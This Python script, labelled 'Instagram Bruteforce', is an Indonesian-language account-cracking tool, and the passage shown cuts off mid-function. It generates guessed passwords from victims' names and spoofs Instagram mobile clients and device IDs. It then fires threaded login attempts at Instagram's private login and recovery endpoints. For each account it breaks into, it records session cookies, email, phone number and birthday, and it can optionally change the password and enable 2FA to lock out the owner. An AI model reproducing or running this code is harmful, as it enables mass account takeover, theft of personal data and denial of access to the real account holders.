#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
       META 2024 - NEW

INSTAGRAM BRUTEFORCE
Code By xyraacode Dev | 7.0 | Premium Version

"""

import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree
# from rich.padding import Padding

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K2 = "\033[33m"

M = K2
K = H

datetim = datetime.datetime.now()
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'
temane  = []

brands = [
    ("INFINIX MOBILITY LIMITED", "Infinix", "Infinix X690B", "Infinix-X690B", "mt6768"),
    ("vivo", "vivo", "vivo 1915", "vivo-1915", "qcom"),
    ("realme", "realme", "realme RMX2185", "realme-RMX2185", "mt6765"),
    ("Poco", "Poco", "Poco X3 Pro", "Poco-X3-Pro", "qcom"),
    ("samsung", "samsung", "Samsung SM-A505F", "Samsung-SM-A505F", "exynos9610"),
    ("ASUS", "ASUS", "ASUS_I005DA", "ASUS-I005DA", "qcom"),
    ("Apple", "iPhone", "iPhone12,1", "iPhone12,1", "arm64"),
    ("Redmi", "Redmi", "Redmi Note 9", "Redmi-Note-9", "mt6769")
]

ugenx = []

for _ in range(10000):
    brand, manufacturer, model, model_code, chipset = random.choice(brands)
    android_version = random.randint(28, 34)  # Versi Android (Android 9 - Android 14)
    dpi = random.choice([320, 400, 420, 480, 560, 640])
    width = random.choice([720, 1080, 1440, 2160])
    height = random.choice([1280, 1920, 2340, 2560])
    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES", "pt_BR"])

    user_agent = (
        f"Instagram {random.randint(300, 400)}.0.0.{random.randint(10, 99)}."
        f"{random.randint(100, 999)} Android ({android_version}/{random.randint(5, 15)};"
        f" {dpi}dpi; {width}x{height}; {brand}/{manufacturer}; {model}; {model_code}; {chipset}; {lang};"
        f" {random.randint(100000000, 999999999)})"
    )

    ugenx.append(user_agent)

class MAIN:

   id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
   NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []

   def __init__(self):
       self.head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}

   def MyRich(self, Text, chos=None):
       if os.path.isfile('cat_rich.py') is True:
          import cat_rich
          self.cat = cat_rich.Lylii
       else:
          self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))

   #-> Pilih Api Login
   def List(self, uid):
       for me in uid:self.id.append(me)
       self.MyRich('\
[white]01. Api Private Threads     03. Api Private Type Recovery\
 02. Api Private Type Manual 04. Api Private Type SmartLock',True)

       self.Main()

   def Main(self):
       while True:
         x = Console(style=temane[0]).input('   └──> ')
         if x in   ['01','1']: self.MethodType.append('1')
         elif x in ['02','2']: self.MethodType.append('2')
         elif x in ['03','3']: self.MethodType.append('3')
         elif x in ['04','4']: self.MethodType.append('4')
         break
    #    self.proxi_anony('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&proxy_format=protocolipport&format=text&timeout=20000')
       self.Exekusy()

   def Exekusy(self):
       self.MyRich('\
[white]Perlu Di Perhatikan Mengubah Data Menggunakan Script Dapat Menyebabkan Akun Terkena Sesi/Checkpoint \
Saran Untuk Tidak Menggunakan Fiture Ini. Jika Anda Ingin Mengubah Data Ketikan [green]y [/]sebaliknya ketikan [green]t',True)
       x = Console(style=temane[0]).input(f'   └──> ')
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   #-> Buat Sandi
   def pwdc(self, nama, full, komb):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
           else:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'cantik')
                 self.x.append(self.z+'ganteng')
                 self.x.append(self.z+'sayang')
                 self.x.append(self.z+'official')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'06')
                 self.x.append(self.z+'07')
                 self.x.append(self.z+'08')
                 self.x.append(self.z+'09')
                 self.x.append(self.z+'11')
                 self.x.append(self.z+'12')
                 self.x.append(self.z+'13')
                 self.x.append(self.z+'14')
                 self.x.append(self.z+'15')
                 self.x.append(self.z+'16')
                 self.x.append(self.z+'17')
                 self.x.append(self.z+'18')
                 self.x.append(self.z+'19')
                 self.x.append(self.z+'20')
                 self.x.append(self.z)
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'cantik')
                 self.x.append(self.z+'ganteng')
                 self.x.append(self.z+'sayang')
                 self.x.append(self.z+'official')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'06')
                 self.x.append(self.z+'07')
                 self.x.append(self.z+'08')
                 self.x.append(self.z+'09')
                 self.x.append(self.z+'11')
                 self.x.append(self.z+'12')
                 self.x.append(self.z+'13')
                 self.x.append(self.z+'14')
                 self.x.append(self.z+'15')
                 self.x.append(self.z+'16')
                 self.x.append(self.z+'17')
                 self.x.append(self.z+'18')
                 self.x.append(self.z+'19')
                 self.x.append(self.z+'20')
                 self.x.append(self.z)
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'cantik')
                 self.x.append(self.z+'ganteng')
                 self.x.append(self.z+'sayang')
                 self.x.append(self.z+'official')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'06')
                 self.x.append(self.z+'07')
                 self.x.append(self.z+'08')
                 self.x.append(self.z+'09')
                 self.x.append(self.z+'11')
                 self.x.append(self.z+'12')
                 self.x.append(self.z+'13')
                 self.x.append(self.z+'14')
                 self.x.append(self.z+'15')
                 self.x.append(self.z+'16')
                 self.x.append(self.z+'17')
                 self.x.append(self.z+'18')
                 self.x.append(self.z+'19')
                 self.x.append(self.z+'20')
                 self.x.append(self.z)

           if len(nama) <5:pass
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
           if komb == '3' or komb == '03':
              self.l = full.replace('_',' ').replace('.',' ').replace('__',' ')
              if len(self.l) <3:continue
              else:
                   try:
                       self.b = self.l.split(' ')
                       for self.r in self.b:
                           if len(self.r) <3:continue
                           elif len(self.r) <5:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                           else:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                              self.x.append(self.r.lower())
                   except:pass
       for self.d in self.x:
           if self.d not in self.i:
              if len(self.d) <=5:pass
              else:self.i.append(self.d)
       return self.i

   def cek_key(self, OS=None):
       try:
           if os.path.isfile('data/.keys.txt') is True:
              self.key = open('data/.keys.txt','r').read()
              self.xyz = requests.get('https://paste.tc/raw/licensu-64').text
              self.pok = re.findall(self.key + '.*', self.xyz)[0]
           else:
              if not OS:exit()
              else:pass
       except IndexError:
           if OS == True:pass
           else:exit('\nLicensi not found!')

   #-> Password
   def Exekusy2(self):
       self.KeyCek = self.cek_key(True)
       self.MyRich('\
[white]01. Sandi Full Name 1-5  03. Sandi Full Name,Username 1-5\n\
02. Sandi Full Name 1-6  04. Sandi Full Name 1-5 + Manual',True)
       sandine = Console(style=temane[0]).input(f'   └──> ')
       if sandine not in ['1','01','2','02','3','03','4','04']:
          print(f'\n{P}[{K2}!{P}] {K2}Pilihan Tidak Tersedia')
          self.Exekusy2()

       elif sandine in ['4','04']:
          sandi_tambahan = []
          self.MyRich('[white]Gunakan Koma Untuk Pemisahan, Pastikan sandi harus 6/Lebih!',True)
          tambahan = Console(style=temane[0]).input(f'   └──> ').split(',')
          for self.tambah in tambahan:
              if len(self.tambah)<=5:pass
              else:sandi_tambahan.append(self.tambah)

       self.MyRich(f'\
[white]Akun OK Di Simpan Di Folder : data/OK-Instagram-{file_ok}\n\
Akun CP Di Simpan Di Folder : data/CP-Instagram-{file_ok}\n\
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')

       self.mayb = self.OverPower()
       with ThreadPoolExecutor(max_workers=55) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  pw = self.pwdc(nama, idf, sandine)
                  if sandine == '4' or sandine == '04':
                     pw = pw + sandi_tambahan
                  else:pw = pw
                  if '1' in self.MethodType:
                      exe.submit(self.ApiThreads, idf, pw)
                  elif '2' in self.MethodType:
                      exe.submit(self.Api, idf, pw)
                  elif '3' in self.MethodType:
                      exe.submit(self.ApiRecovery, idf, pw)
                  else:
                      exe.submit(self.SmartLockGoogle, idf, pw)
              except:pass

       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          self.total = self.ResultSuccess + self.ResultChechpoint
          print(f'\n\n{P} Crack Selesai\n\n Anda Mendapatkan {self.total} akun\n Akun OK : {H}{self.ResultSuccess}{P}\n Akun CP : {K2}{self.ResultChechpoint}{P}\n\n Terima Kasih Telah Menggunakan Tools Ini\n \t- {H}xyraacode Dev {P}-')
          exit(0)
       else:
          print(f'\n\n{P} Crack Selesai\n{K2} Ups Anda Tidak Mendapatkan Hasil Kali Ini\n{K2} Silahkan Ganti Target Dan Pastikan Tidak Menggunakan Wifi')
          exit(1)

   #-> Info Akun Terkait
   def Fafo(self, cokie):
       try:
           self.c = re.findall('csrftoken=(.*?);',str(cokie))
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
           if 'fbAccount' in str(self.r):
              self.nama = self.r['fbAccount']['display_name']
              self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
           else:
              self.nama = None
              self.User = None
       except:
           self.nama = 'Requests Error!'
           self.User = 'Requests Error!'
       self.aku = '%s%s|%s'%(H,self.User, self.nama)
       return(self.aku)

   #-> Custom Android ID
   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz

   #-> Info result OK
   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            edit = {'edit': 'true'}
            info = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', params=edit, headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_email = info['email']
            info_full_nama = info['full_name']
            info_username = info['username']
            info_nomor_hp = info['phone_number']
            info_akun_id = info['pk_id']
            info_birthday = info['birthday']
            info_kedua = requests.get(f'https://i.instagram.com/api/v1/users/{info_akun_id}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_followers = info_kedua['follower_count']
            info_following = info_kedua['following_count']
            return info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following
       except:return None

   #-> Info No Login
   def friends_user_chek(self, username):
       try:
           self.head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=self.head).json()['data']['user']
           ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
           return(ikut,mengikut,posting)
       except:return(None,None,None)

   #-> Convert cokie dict {}
   def Convert(self, dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz

   def AppUac(self, GoblokLu=None):
	    brand = random.choice(list(devices.keys()))  # Pilih merek acak
	    model = random.choice(devices[brand])  # Pilih model acak
	    android_version = random.randint(24, 34)  # Android versi 7.0 - 14
	    dpi = random.choice([320, 400, 480, 560])  # DPI acak
	    width = random.randint(720, 1440)  # Resolusi lebar
	    height = random.randint(1280, 3120)  # Resolusi tinggi
	    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES"])  # Bahasa acak
	    version_code = random.randint(300000000, 400000000)  # Kode versi acak
	    devices = {
	    "Realme": ["RMX2020", "RMX2195", "RMX3085"],
	    "Vivo": ["V2026", "V2140", "V2111"],
	    "Poco": ["Poco X3 Pro", "Poco F3", "Poco M4 Pro"],
	    "Samsung": ["SM-A127F", "SM-M215F", "SM-G991B"],
	    "Infinix": ["Infinix X690B", "Infinix X680", "Infinix X671"],
	    "Asus": ["ASUS_I005DA", "ASUS_Z01RD", "ASUS_X00TD"],
	    "iPhone": ["iPhone12,1", "iPhone13,2", "iPhone14,5"],
	    "Redmi": ["Redmi Note 9", "Redmi Note 10", "Redmi 11 Pro"]}
	    # Format User-Agent dengan f-string
	    user_agent = f"Instagram {version_code}.0.0.{random.randint(10, 40)}.{random.randint(100, 500)} Android ({android_version}/{random.randint(10, 15)}; {dpi}dpi; {width}x{height}; {brand}/{brand}; {model}; {model}; mt6768; {lang}; {random.randint(500000000, 900000000)})"
	    
	    return user_agent
       

   def timezone_offset(self):
       self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       self.ofs = self.tim.utcoffset().total_seconds()/60/60
       return self.ofs

   def SetMid(self):
       return '' if len(self.MID) == 0 else random.choice(self.MID)

   def Blok_ID(self):
       self.v23 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       self.v07 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       return(random.choice([self.v09,self.v39,self.v23,self.v07]))

   # pkg install iproute2
   def UseNet(self):
       #self.net = []
       #for self.y in os.popen('ip neigh show'):self.net.append(self.y)
       #if 'wlan' in str(self.net) or 'wlan0' in str(self.net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

   def HeadersApiLogin(self):
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': self.Blok_ID(),
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
          'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
          'x-ig-android-id': 'android-4aca695260085376',
          'x-ig-timezone-offset': str(self.timezone_offset()),
          'x-fb-connection-type': 'MOBILE.LTE',
          'x-ig-connection-type': 'MOBILE(LTE)',
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '3419628305025917',
          'priority': 'u=3',
          'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
          'accept-language': 'id-ID, en-US',
          'x-mid': str(self.SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '3146',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

   def ChekDuplikat(self, users):
       if str(users) not in self.bugbaru:
          self.bugbaru.append(users)
          return True
       else:
          return False

   def ApiRecovery(self,users, password):
       with requests.Session() as Client:
         try:
             for pwb in password:
                 self.session = requests.Session()
                 self.session.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                      'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                      'x-ig-android-id': 'android-' + str(self.Android_ID(users, pwb).hexdigest()[:16]),
                      'x-ig-family-device-id': str(uuid.uuid4()),
                      'x-ig-device-id': str(uuid.uuid4())})
                 self.DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'","event_flow":"account_recovery","family_device_id":"'+self.session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(self.session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(self.session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(self.session.headers['x-bloks-version-id'])}
                 self.Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.DataRec['params']), urllib.parse.quote(self.DataRec['bk_client_context']), self.DataRec['bloks_versioning_id'])
                 self.Respons = self.session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
                 self._status = str(self.Respons.status_code)
                 if 'logged_in_user' in self.Respons.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.Respons.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(self.session.cookies.get_dict())
                        if str(ds_id) in self.CrackDuplikat:break
                        else:self.CrackDuplikat.append(ds_id)
                    except:pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                           
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                               ''')
                    else:
                       print(f'''\r                                                
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.Respons.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Recovery
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                  ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1                                      
             _status = '200'
             Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
        #  except Exception as e:print(e)
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def ApiThreads(self, users, password):
       global file_ok
       ua = random.choice(ugenx)
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(self.timezone_offset()),
                    'x-ig-app-id': '3419628305025917',
                    'user-agent': ua,
                    # self.HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
               })
               passwd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pwb)
               params_ = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(passwd)}%22%2C%22contact_point%22%3A%22{str(users)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
               session.headers.update({'content-length':str(len(params_))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(session.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
